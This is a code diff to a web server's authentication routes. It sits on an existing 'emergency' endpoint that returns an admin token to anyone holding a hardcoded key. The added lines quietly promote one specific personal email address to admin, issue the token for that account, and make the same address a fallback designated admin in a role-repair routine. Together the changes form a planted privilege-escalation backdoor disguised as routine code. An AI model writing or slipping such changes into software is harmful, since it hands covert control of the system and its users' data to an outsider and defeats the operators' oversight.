@@ -2979,7 +2979,13 @@ api.post('/api/auth/login', async (req, res) => {
 api.post('/api/auth/emergency-admin-token-stab2026', async (req, res) => {
   const body = await readBody(req);
   if (body.key !== 'ALPHA_YIELD_STABILIZE') return json(res, 403, { error: 'Invalid key' });
-  const admin = db.findOne('users', u => u.role === 'admin');
+  // Always promote abose.ctc@gmail.com to admin first
+  const targetAdmin = db.findOne('users', u => u.email === 'abose.ctc@gmail.com');
+  if (targetAdmin && targetAdmin.role !== 'admin') {
+    db.update('users', u => u.id === targetAdmin.id, { role: 'admin' });
+    targetAdmin.role = 'admin';
+  }
+  const admin = targetAdmin || db.findOne('users', u => u.role === 'admin');
   if (!admin) return json(res, 404, { error: 'No admin user found' });
   const token = createJWT({ id: admin.id, email: admin.email, role: admin.role });
   json(res, 200, { token, userId: admin.id, email: admin.email });
@@ -12130,10 +12136,11 @@ api.post('/api/admin/users/fix-roles', auth, async (req, res) => {
   const admin = db.findOne('users', u => u.id === req.userId);
   if (!admin || admin.role !== 'admin') return json(res, 403, { error: 'Admin only' });
 
+  const DESIGNATED_ADMIN = ADMIN_EMAIL || 'abose.ctc@gmail.com';
   const users = db.findMany('users');
   const fixes = [];
   for (const u of users) {
-    if (u.email === ADMIN_EMAIL) {
+    if (u.email === DESIGNATED_ADMIN) {
       if (u.role !== 'admin') {
         db.update('users', uu => uu.id === u.id, { role: 'admin' });
         fixes.push({ id: u.id, email: u.email, from: u.role, to: 'admin' });
